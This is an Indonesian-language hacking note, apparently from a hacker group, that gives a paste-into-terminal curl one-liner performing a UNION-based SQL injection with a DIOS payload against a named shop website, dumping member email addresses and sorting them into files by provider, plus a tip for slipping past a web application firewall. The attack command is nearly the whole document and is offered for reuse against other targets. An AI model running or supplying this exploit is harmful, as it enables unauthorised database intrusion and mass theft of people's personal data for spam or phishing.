# Extract-data-with-SQLi (curl & grep)

PERTAMA :.
Inject manual seperti biasa dengan dios yg uda nampilin all email

Langsung replace dengan target yg uda didios mode dump data ya

Paste di terminal bungurasih ya :v

curl --silent "http://m.sweetyboutique.com/product-detail.php?id=13584+and+0+/*"\!"00000UNION*/+SELECT+1,(select(@x)from(select(@x:=0x00),(select(0)from(tmember)where(@x:=/*"\!"00000concat*/(@x,0x3c62723e,email))))x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--+" >> tmp;grep -o '[[:alnum:]+\.\_\-]*@[[:alnum:]+\.\_\-]*' "tmp" | sort | uniq -i > list;echo "";echo "Total Dumped : `wc -l list`";for i in gmail yahoo aol hotmail;do cat list | grep $i > $i.txt;echo "[+] `wc -l $i.txt`";done;cat list | grep -v gmail | grep -v yahoo | grep -v aol | grep -v hotmail > others.txt;echo "[+] others : `wc -l others.txt`";rm tmp;

NB (penting) : 
klo utk smisal ada waf yg perlu pake /*! Comment */
Tanda ! Harus diginiin "\!" ya

Result :

Lgsg berbentuk txt sort by kandang (gmail,aol,dll)

Keep simple 

Versailles ~ Cans21
Sec7or Team - Surabaya Hacker Link
